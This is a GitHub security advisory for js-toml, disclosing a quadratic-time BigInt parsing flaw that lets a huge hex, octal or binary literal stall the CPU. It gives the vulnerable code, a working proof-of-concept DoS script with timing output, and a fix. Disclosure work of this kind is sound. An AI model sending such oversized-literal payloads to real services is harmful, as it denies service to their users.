# [H] js-toml vulnerable to CPU exhaustion via O(n^2) BigInt construction on radix-prefixed integer literals

## Summary
Severity: High
Advisory: GHSA-wp3c-266w-4qfq
CVE: CVE-2026-49293
CWE: CWE-1333, CWE-400, CWE-407
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-06-26
Source: https://github.com/advisories/GHSA-wp3c-266w-4qfq
Type: github-advisory

## Affected
- npm: `js-toml` — affected >=0 <1.1.1

## Details
## Summary

`js-toml` versions up to and including **1.1.0** parse hexadecimal / octal / binary integer literals via a hand-written `parseBigInt` loop that multiplies a `BigInt` accumulator by the radix once per input digit. Each iteration performs a `BigInt * BigInt` operation on an accumulator that grows linearly with the number of digits already consumed, so the whole loop is **O(n²)** in the literal length. The lexer regex places **no upper bound on the literal length**, so a single TOML document containing one ~500 kB hex literal pins one CPU core for **~40 seconds** on a modern laptop (Apple M-series, Node v22). Memory amplification is bounded but CPU amplification is severe and grows quadratically: doubling the literal length quadruples the work.

A caller that invokes `load()` on attacker-controlled TOML (configuration upload endpoints, CI/CD systems ingesting third-party `*.toml`, IDE plugins, build tools) is exposed to a single-request CPU exhaustion DoS.

CWE-1333 (Inefficient Regular Expression Complexity → here, inefficient parser complexity), CWE-400 (Uncontrolled Resource Consumption), CWE-407 (Inefficient Algorithmic Complexity).

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H = **7.5 (HIGH)** when the parser is invoked on attacker-controllable input; LOW when the calling application restricts TOML input size to small documents (< 1 kB).

## Affected

- Package: `js-toml` (npm)
- Versions: `>= 0.0.0, <= 1.1.0` (all released versions up to and including the current `1.1.0`)
- Affected entry point: `load()` exported from the package root

## Vulnerable code

`src/load/tokens/NonDecimalInteger.ts` lines 54-84 at SHA-pinned [`2470ebf2e9009096aa4cbd1a15e574c54cc36b1a`](https://github.com/sunnyadn/js-toml/blob/2470ebf2e9009096aa4cbd1a15e574c54cc36b1a/src/load/tokens/NonDecimalInteger.ts#L54-L84):

```ts
const parseBigInt = (string: string, radix: number): bigint => {
  let result = BigInt(0);
  for (let i = 0; i < string.length; i++) {
    const char = string[i];
    const digit = parseInt(char, radix);
    result = result * BigInt(radix) + BigInt(digit);
  }

  return result;
};
```

and the interpreter that dispatches to it at lines 72-84:

```ts
registerTokenInterpreter(NonDecimalInteger, (raw: string) => {
  const intString = raw.replace(/_/g, '');
  const digits = intString.slice(2);
  const radix = getRadix(raw);

  const int = parseInt(digits, radix);

  if (Number.isSafeInteger(int)) {
    return int;
  }

  return parseBigInt(digits, radix);
});
```

Two compounding problems:

1. **Algorithmic**: the loop performs `result * BigInt(radix) + BigInt(digit)` once per input digit. After `i` iterations `result` has `O(i)` limbs, so the multiply costs `O(i)`. Summed over `n` digits the total cost is `O(n²)`.

2. **No length guard**: the lexer regex at [`src/load/tokens/NonDecimalInteger.ts#L14-L46`](https://github.com/sunnyadn/js-toml/blob/2470ebf2e9009096aa4cbd1a15e574c54cc36b1a/src/load/tokens/NonDecimalInteger.ts#L14-L46) is `0x<hexDigit>(<hexDigit>|_<hexDigit>)*` (likewise for `0o` / `0b`). The literal length is bounded only by the input document size. There is no `maxNumberLength` / `maxLiteralLength` option, no `chevrotain`-level cutoff, and no validation at the interpreter callsite.

By contrast, the `DecimalInteger` token interpreter at [`src/load/tokens/DecimalInteger.ts#L12-L19`](https://github.com/sunnyadn/js-toml/blob/2470ebf2e9009096aa4cbd1a15e574c54cc36b1a/src/load/tokens/DecimalInteger.ts#L12-L19) uses the V8 native `BigInt(intString)` constructor, which is `O(n)` and runs in single-digit milliseconds for inputs that take 40 seconds via the hand-written radix loop.

## Impact

A single attacker-supplied TOML document containing one ~500 kB radix-prefixed integer literal pins one CPU core for ~40 seconds on a modern laptop. Doubling the literal length quadruples the work. With `8 MB` of input the parse would block the event loop for many minutes of CPU. In a typical Node.js single-thread process this blocks all concurrent request handling for the duration. The defect is exploitable on any code path that calls `load()` (the only documented entry point) on attacker-controlled or third-party TOML.

## Reachability

The vulnerable path is the default code path for `load()`. No options or configuration are required to trigger it. Any caller that exposes `load()` to attacker-controlled or third-party TOML input reaches it on the first hex / octal / binary literal whose value exceeds `Number.MAX_SAFE_INTEGER` (i.e. more than 13 hex digits, 18 octal digits, or 53 binary digits).

Realistic exposure surfaces:

- Web service that accepts a user-supplied TOML configuration (settings import, theme upload, deployment manifest).
- CI / CD or build tool that runs `js-toml` on TOML in third-party repositories or pull requests.
- IDE / language-server plugin that re-parses a TOML buffer on every keystroke.
- Multi-tenant SaaS that lets one tenant submit TOML processed by a shared worker.

## PoC (End-to-end reproduction)

### Environment

- Node.js `v22.x` (tested on `v22.0.0` and Node `v26.0.0`)
- macOS arm64 / Linux x86_64 (CPU exhaustion is hardware-independent; absolute timings will scale by CPU clock)

### Install

```bash
mkdir js-toml-cve && cd js-toml-cve
npm init -y
npm install js-toml@1.1.0 @iarna/toml
```

### `poc_full_e2e.mjs`

```js
import { load } from 'js-toml';
import iarna from '@iarna/toml';

function timeIt(label, fn) {
  const t0 = process.hrtime.bigint();
  let result, err;
  try { result = fn(); } catch (e) { err = e; }
  const t1 = process.hrtime.bigint();
  const ms = (Number(t1 - t0) / 1e6).toFixed(1);
  if (err) console.log(`${label}: ERROR ${err.message} after ${ms}ms`);
  else     console.log(`${label}: ${ms}ms${result ? ' ' + result : ''}`);
}

console.log('--- Sanity baseline (small inputs) ---');
timeIt('decimal int 1', () => { load('x = 1'); return ''; });
timeIt('hex 0x10',      () => { load('x = 0x10'); return ''; });
timeIt('hex 0xffff',    () => { load('x = 0xffff'); return ''; });

console.log('\n--- Amplification curve: js-toml.load() with 0x<N hex digits> ---');
for (const n of [10_000, 20_000, 50_000, 100_000, 200_000, 500_000]) {
  const hexDigits = 'f'.repeat(n);
  const tomlText  = `x = 0x${hexDigits}`;
  timeIt(`hex ${n.toLocaleString()} digits (${tomlText.length} bytes input)`,
    () => {
      const r = load(tomlText);
      return `bits=${r.x.toString(2).length}`;
    });
}

console.log('\n--- Negative control: same input via @iarna/toml ---');
for (const n of [10_000, 50_000, 100_000, 200_000]) {
  const hexDigits = 'f'.repeat(n);
  const tomlText  = `x = 0x${hexDigits}`;
  timeIt(`@iarna/toml hex ${n.toLocaleString()} digits`,
    () => {
      const r = iarna.parse(tomlText);
      return `type=${typeof r.x}`;
    });
}

console.log('\n--- Octal / binary share the same code path ---');
for (const n of [50_000, 100_000]) {
  const octDigits = '7'.repeat(n);
  const binDigits = '1'.repeat(n);
  timeIt(`oct 0o${n.toLocaleString()} digits`,
    () => { const r = load(`x = 0o${octDigits}`); return `bits=${r.x.toString(2).length}`; });
  timeIt(`bin 0b${n.toLocaleString()} digits`,
    () => { const r = load(`x = 0b${binDigits}`); return `bits=${r.x.toString(2).length}`; });
}
```

### Captured run output (unpatched `js-toml@1.1.0`, Node v26.0.0, Apple M-series)

```
# js-toml version: 1.1.0

--- Sanity baseline (small inputs) ---
decimal int 1: 1.3ms
hex 0x10: 0.4ms
hex 0xffff: 0.1ms

--- Amplification curve: js-toml.load() with 0x<N hex digits> ---
hex 10,000 digits (10006 bytes input): 15.0ms bits=40000
hex 20,000 digits (20006 bytes input): 29.8ms bits=80000
hex 50,000 digits (50006 bytes input): 214.7ms bits=200000
hex 100,000 digits (100006 bytes input): 693.0ms bits=400000
hex 200,000 digits (200006 bytes input): 3239.6ms bits=800000
hex 500,000 digits (500006 bytes input): 40388.3ms bits=2000000

--- Negative control: same input via @iarna/toml ---
@iarna/toml hex 10,000 digits: 2.3ms type=bigint
@iarna/toml hex 50,000 digits: 3.2ms type=bigint
@iarna/toml hex 100,000 digits: 5.4ms type=bigint
@iarna/toml hex 200,000 digits: 10.2ms type=bigint

--- Octal / binary share the same code path ---
oct 0o50,000 digits: 187.6ms bits=150000
bin 0b50,000 digits: 49.5ms bits=50000
oct 0o100,000 digits: 633.2ms bits=300000
bin 0b100,000 digits: 196.8ms bits=100000
```

Confirmation points:

- Quadratic curve: 10k → 20k digits is ~2x time (15ms → 30ms); 100k → 200k is ~4.7x time (693ms → 3239ms); 200k → 500k (2.5x) is ~12x time (3.2s → 40s). Matches the predicted `O(n²)`.
- Single ~500 kB document blocks the event loop for ~40 s of CPU time.
- Octal and binary literals trigger the same path through `parseBigInt(digits, 8)` and `parseBigInt(digits, 2)`.
- The negative control (`@iarna/toml`, which calls the V8 native `BigInt(value)` constructor) parses the same inputs in 2-10 ms. The defect is in `js-toml`'s hand-written radix conversion, not in V8 `BigInt` semantics or in the input size itself.

### Patched-build verification

After applying the fix (replace `parseBigInt(digits, radix)` with `BigInt('0' + raw[1] + digits)` and add a `maxLiteralLength` guard at the interpreter callsite), the same PoC produces:

```
--- Amplification curve: js-toml.load() with 0x<N hex digits> ---
hex 10,000 digits: 0.2ms bits=40000
hex 20,000 digits: 0.3ms bits=80000
hex 50,000 digits: 0.7ms bits=200000
hex 100,000 digits: 1.5ms bits=400000
hex 200,000 digits: 2.8ms bits=800000
hex 500,000 digits: 7.1ms bits=2000000
```

(Linear scaling, sub-10 ms even on inputs five orders of magnitude larger than any realistic literal.) With a 1000-digit cap applied at the interpreter callsite, literals beyond the cap raise `SyntaxParseError` instead of being parsed at all, matching the `maxNumberLength` convention used by `jackson-core` `StreamReadConstraints` and `gson` `NumberLimits`.

## Suggested fix

Two changes, both in [`src/load/tokens/NonDecimalInteger.ts`](https://github.com/sunnyadn/js-toml/blob/2470ebf2e9009096aa4cbd1a15e574c54cc36b1a/src/load/tokens/NonDecimalInteger.ts):

1. Replace the hand-written `parseBigInt` loop with the V8 native `BigInt(prefixedString)` constructor. `BigInt` natively accepts the `0x` / `0o` / `0b` prefix and parses in `O(n)`:

   ```ts
   registerTokenInterpreter(NonDecimalInteger, (raw: string) => {
     const intString = raw.replace(/_/g, '');
     const digits = intString.slice(2);
     const radix = getRadix(raw);

     // Optional but recommended: cap the literal length to avoid degenerate inputs
     const MAX_RADIX_LITERAL_LENGTH = 1000;
     if (digits.length > MAX_RADIX_LITERAL_LENGTH) {
       throw new SyntaxParseError(
         `Radix-prefixed integer literal exceeds ${MAX_RADIX_LITERAL_LENGTH} digits`
       );
     }

     const int = parseInt(digits, radix);
     if (Number.isSafeInteger(int)) {
       return int;
     }

     // BigInt accepts '0x'/'0o'/'0b' prefix natively
     return BigInt(intString);
   });
   ```

2. Delete the `parseBigInt` helper. The native constructor handles all three radices.

Either change alone fixes the worst-case wall-clock. The combination matches the constraint posture of `jackson-core` (`StreamReadConstraints.validateIntegerLength`) and `gson` (`NumberLimits.checkNumberStringLength`).

## Fix PR link

https://github.com/sunnyadn/js-toml/commit/1abcb31dc7b1fa88e4c848a8d108891cfbb96fa2

## Credit

Reported by `tonghuaroot`.

## References
- https://github.com/sunnyadn/js-toml/security/advisories/GHSA-wp3c-266w-4qfq
- https://nvd.nist.gov/vuln/detail/CVE-2026-49293
- https://github.com/sunnyadn/js-toml/commit/1abcb31dc7b1fa88e4c848a8d108891cfbb96fa2
- https://github.com/sunnyadn/js-toml
- https://github.com/sunnyadn/js-toml/releases/tag/v1.1.1
